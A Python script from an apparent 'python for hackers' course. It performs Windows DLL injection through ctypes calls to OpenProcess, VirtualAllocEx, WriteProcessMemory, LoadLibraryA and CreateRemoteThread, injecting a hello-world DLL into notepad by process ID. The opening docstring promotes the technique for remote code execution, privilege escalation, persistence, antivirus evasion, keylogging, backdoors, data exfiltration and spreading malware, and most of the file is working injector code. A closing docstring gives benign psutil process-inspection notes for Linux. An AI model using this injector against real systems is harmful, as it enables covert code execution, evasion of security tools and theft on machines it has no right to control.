''' 
dll are libraries in our Windows OS and also can be downloaded from internet if that specific library is not already in the OS
i.e it contain files(codes) and procedures for windows program to perform specific task(eg: memory management, file operations
, system shutdown etc) so that the programs that we download/pre-installed dont need to have these codes to use these functionality 
, i.e these programs can directly use .dll file that has the code for the specific task  required by the program (therefore its shared 
library that allow programs resource sharing, reduce the size of programs  resulting efficient memory usage, can extend functionality of 
any program without modifying its code ,OS ensure that required dll's are available for the programs(that we download/pre-installed)
, reduce memory usage and increase performance by speeding up program startup time)

eg of dll libraries : kernel32.dll , user32.dll , Gdi32.dll, Advapi32.dll, Comdlg32.dll, Shell32.dll, Ole32.dll, Ws2_32.dll, Msvcrt.dll,Ntdll.dll 


The scope of remote-dll(dynamic link library)-injection:-
                we can use this to inject a malicious DLL( .dll file) into a process running on a remote system this will allow us to :

1)Execute arbitary code on remote system (i.e without any restriction) & can be used to steal data, manipulate system settings ,etc.
2)priviledge escalation (we can gain/escalate higher access rights by targeting process that have higher priviledges and rights 
, gain control over sensitive resources)
3)Persistance (we can ensure that malicious code persists across system reboot by injecting dll in a process that runs at startup/regularly executed)
4)Bypass security measures (antivirus S/W , F/W ) on remote system allowing us to remain undetected
5)Kelogging (we can use dll injection to inject a keylogger in a process on remote system and steal sensitive data)
6)Remote Access (we can establish a backdoor or remote access tool on the remote system allowing us to control the system remotely)
7)Data Exfiltration (we can extract sensitive data from target system to a remote server controlled by us)
8)spread malware (can also be used to spread malware to other un affected systems on the network)

PS: in this dll injection code we are using Hello_world.c code that code basically says that inject hello world in notepad than we converted that C code( .c file) into 
.dll file and used that dll file for dll injection 

'''



'''

for linus os:-
sudo apt install python3-venv
python3 -m venv myenv
source myenv/bin/activate



for windows os:-
python -m venv MyVenv
Set-ExecutionPolicy RemoteSigned   (if needed not all the time)
MyVenv/Scripts/activate
'''
#https://learn.microsoft.com/en-us/troubleshoot/windows-client/setup-upgrade-and-drivers/dynamic-link-library
#https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
#https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
#https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
#https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea
#https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress
#https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread


#gcc -shared -o Hello_World.dll Hello_World.c
#gcc -shared -o Hello_World.dll Hello_World.c -Wl,--out-implib,libHello_World.a




#Note : remember to update the proper Pid and .c , .dll file as per requirement (always use proper pid)
from ctypes import *
from ctypes import wintypes

kernel32 = windll.kernel32
LPCTSTR = c_char_p
SIZE_T = c_size_t

OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD)
OpenProcess.restype = wintypes.HANDLE

VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T,wintypes.DWORD,wintypes.DWORD)
VirtualAllocEx.restype = wintypes.LPVOID

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = (wintypes.HANDLE, wintypes.LPVOID,wintypes.LPCVOID, SIZE_T, POINTER(SIZE_T))
WriteProcessMemory.restype = wintypes.BOOL

GetModuleHandle = kernel32.GetModuleHandleA
GetModuleHandle.argtypes = (LPCTSTR, )
GetModuleHandle.restype = wintypes.HANDLE

GetProcAddress = kernel32.GetProcAddress
GetProcAddress.argtypes = (wintypes.HANDLE, LPCTSTR)
GetProcAddress.restype = wintypes.LPVOID

class _SECURITY_ATTRUBUTES(Structure):
    _fields_ = [('nlength' , wintypes.DWORD),
                ('lpSecurityDescriptor' , wintypes.LPVOID),
                ('bInheritHandle', wintypes.BOOL),]
    
SECURITY_ATTRUBUTES = _SECURITY_ATTRUBUTES
LPSECURITY_ATTRIBUTES = POINTER(_SECURITY_ATTRUBUTES)
LPTHREAD_START_ROUTINE = wintypes.LPVOID 


CreateRemoteThread = kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = (wintypes.HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD )
CreateRemoteThread.restype = wintypes.HANDLE

MEM_COMMIT =  0x00001000
MEM_RESERVE = 0x00002000
PAGE_READWRITE = 0x04
EXECUTE_IMMEDIATELY = 0x0
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0x00000FFF)

dll = b"Z:\codes\python for hackers\python 201\Python Projects\Remote dll injection\Hello_World.dll"


pid = 5124          #Note: this is the pid of the process you want to target and you can get it from task manager in window os (we require new pid for every execution of this py code)


handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)

if not handle:
    raise WinError()

print("Handle obtained => {0:X}".format(handle))




remote_memory = VirtualAllocEx(handle, False, len(dll) + 1 , MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)

if not remote_memory:
    raise WinError()

print("Memory allocated => {0:X}".format(remote_memory))




write = WriteProcessMemory(handle, remote_memory,dll , len(dll) + 1 , None)

if not write :
    raise WinError()

print("Bytes written => {}".format(dll))




load_lib = GetProcAddress( GetModuleHandle(b"kernel32.dll"), b"LoadLibraryA")

print("LoadLibrary address => ",hex(load_lib))



rthread = CreateRemoteThread(handle, None, 0 , load_lib, remote_memory,EXECUTE_IMMEDIATELY, None)

''' these are the steps to do while executing dll injection(in windows os):-

open notepad then open task manager and note down the Pid of notepad(7444)

'''




















'''
In Ubuntu (and other Linux distributions), you typically don't have an exact equivalent of the Windows OpenProcess function from the ProcessThreadsAPI. Linux handles process management and inter-process communication differently than Windows. However, you can achieve similar functionality using various Linux system calls and tools.

Here's a basic example using psutil, a Python package that provides an interface for retrieving information on running processes and system utilization:

First, install psutil if you haven't already:
pip install psutil

Then, you can use the following Python code to get information about a process by its PID (Process ID):
import psutil

pid = 1234  # Replace 1234 with the PID of the process you want to inspect

try:
    process = psutil.Process(pid)
    print("Process name:", process.name())
    print("Process status:", process.status())
    print("Process memory info:", process.memory_info())
    # Add more attributes as needed
except psutil.NoSuchProcess:
    print("No process found with PID", pid)

This code will give you basic information about a process, such as its name, status, and memory usage.

For more advanced process management, you might need to use other Linux system calls or tools, depending on your specific requirements. Some common tools and system calls for process management in Linux include:

ps: Command-line utility to list currently running processes.
top or htop: Interactive process viewer that provides a dynamic real-time view of running system processes.
/proc filesystem: Virtual filesystem in Linux that provides detailed information about processes and other system information. Each running process has a directory under /proc with its PID as the directory name, containing various files with process information.
kill: Command-line utility to send signals to processes, allowing you to terminate or manipulate processes.
Please note that directly manipulating processes in Linux, especially without proper authorization, can have serious consequences and should be done carefully.
'''
